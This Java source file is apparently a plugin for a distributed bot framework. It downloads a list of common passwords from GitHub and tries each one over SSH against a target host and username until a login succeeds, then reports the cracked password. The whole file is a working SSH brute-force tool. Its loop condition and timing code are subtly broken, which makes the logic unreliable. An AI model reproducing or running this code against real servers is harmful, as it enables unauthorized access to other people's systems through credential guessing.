package org.powertrip.excalibot.common.plugins.bruteforce;

import com.jcraft.jsch.JSchException;
import org.powertrip.excalibot.common.com.SubTask;
import org.powertrip.excalibot.common.com.SubTaskResult;
import org.powertrip.excalibot.common.plugins.KnightPlug;
import org.powertrip.excalibot.common.plugins.interfaces.knight.ResultManagerInterface;
import org.powertrip.excalibot.common.utils.logging.Logger;

import java.util.Calendar;


/**
 * Created by theOthers on 04/01/2016.
 * 04:12
 */
public class Bot extends KnightPlug {

    String correctPass = "";
    String host="";
    String username="";
    String link = "https://raw.githubusercontent.com/GPPowerTrip/SecLists/master/Passwords/500-worst-passwords.txt";
    int begin = 0;
    int end = 0;


    public Bot(ResultManagerInterface resultManager) {
        super(resultManager);
    }

    @Override
    public boolean run(SubTask subTask) {


        SubTaskResult result = subTask.createResult();
        host = subTask.getParameter("host");
        username = subTask.getParameter("username");
        begin = Integer.valueOf(subTask.getParameter("begin"));
        end = Integer.valueOf(subTask.getParameter("end"));
        link = subTask.getParameter("link");


        int i = begin;

        //StringBuilder sb = new StringBuilder();
        CrunchifyLoadGithubContent crunch = new CrunchifyLoadGithubContent(link);
        String lines[] = new String[0];
        try {
            lines = crunch.Crunchify().split("\\r?\\n");
        } catch (Throwable throwable) {
            Logger.error(Calendar.getInstance().getTime().toString()+ "[ERROR]: failed to parse dictionary: bot "+subTask.getKnightInfo().getId()  );
            throwable.printStackTrace();
        }

        while (i != end ||i !=lines.length  ) {
            try {
                new SSHConn(lines[i],host,username);
                correctPass=lines[i];
                break;

            } catch (JSchException e) {
                i++;

            }

        }

        long currentTime = System.currentTimeMillis();
        currentTime = System.currentTimeMillis() - currentTime;
        result
                .setSuccessful(true)
                .setResponse("correctPass", correctPass).setResponse("elapsedTime", String.valueOf(currentTime));
        return true;
    }


}
